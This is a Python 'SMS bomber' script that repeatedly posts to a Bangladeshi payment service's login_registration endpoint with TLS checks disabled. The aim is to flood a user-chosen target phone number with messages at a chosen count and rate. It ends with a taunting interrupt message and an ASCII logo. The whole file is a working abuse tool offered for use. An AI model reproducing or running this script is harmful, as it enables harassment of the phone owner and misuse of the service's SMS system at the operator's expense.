import requests
import time

# Initialize message count
message_count = 0

def send_sms(phone_number, message):
    global message_count  # Access the global message count variable
    url = "https://ap.paymasterbd.net/login_registration/"
    headers = {
        "Host": "ap.paymasterbd.net",
        "Content-Type": "application/x-www-form-urlencoded",
        "Content-Length": "90",
        "Accept-Encoding": "gzip",
        "User-Agent": "okhttp/3.14.9",
    }

    data = {
        "phone_number": phone_number,
        "fcm_key": "",
        "device_id": "97bfda77edefe5",
        "sms_hash_code": message,
    }

    response = requests.post(url, headers=headers, data=data, verify=False)

    if response.status_code == 200:
        message_count += 1  # Increment the message count
        print("SMS sent to", phone_number)
        print("Total messages sent:", message_count)  # Display message count
    else:
        print("Failed to send SMS to", phone_number)

phone_number = input("Enter the target phone number: ")
message = input("Enter the message to send: ")
num_messages = int(input("Enter the number of messages to send: "))

try:
    for _ in range(num_messages):
        send_sms(phone_number, message)
        time.sleep(0.3)  # Adjust this value to send messages at the desired rate
except KeyboardInterrupt:
    print("SMS bombing interrupted. You coward!")
#My wicked logo:
print('''
                                                                                               
                                                                                               
               AAA               RRRRRRRRRRRRRRRRR   XXXXXXX       XXXXXXXUUUUUUUU     UUUUUUUU
              A:::A              R::::::::::::::::R  X:::::X       X:::::XU::::::U     U::::::U
             A:::::A             R::::::RRRRRR:::::R X:::::X       X:::::XU::::::U     U::::::U
            A:::::::A            RR:::::R     R:::::RX::::::X     X::::::XUU:::::U     U:::::UU
           A:::::::::A             R::::R     R:::::RXXX:::::X   X:::::XXX U:::::U     U:::::U 
          A:::::A:::::A            R::::R     R:::::R   X:::::X X:::::X    U:::::D     D:::::U 
         A:::::A A:::::A           R::::RRRRRR:::::R     X:::::X:::::X     U:::::D     D:::::U 
        A:::::A   A:::::A          R:::::::::::::RR       X:::::::::X      U:::::D     D:::::U 
       A:::::A     A:::::A         R::::RRRRRR:::::R      X:::::::::X      U:::::D     D:::::U 
      A:::::AAAAAAAAA:::::A        R::::R     R:::::R    X:::::X:::::X     U:::::D     D:::::U 
     A:::::::::::::::::::::A       R::::R     R:::::R   X:::::X X:::::X    U:::::D     D:::::U 
    A:::::AAAAAAAAAAAAA:::::A      R::::R     R:::::RXXX:::::X   X:::::XXX U::::::U   U::::::U 
   A:::::A             A:::::A   RR:::::R     R:::::RX::::::X     X::::::X U:::::::UUU:::::::U 
  A:::::A               A:::::A  R::::::R     R:::::RX:::::X       X:::::X  UU:::::::::::::UU  
 A:::::A                 A:::::A R::::::R     R:::::RX:::::X       X:::::X    UU:::::::::UU    
AAAAAAA                   AAAAAAARRRRRRRR     RRRRRRRXXXXXXX       XXXXXXX      UUUUUUUUU      
                                                                                               
                                                                                               
                                                                                               
                                                                                               
                                                                                               
                                                                                               
                                                                                               
''')
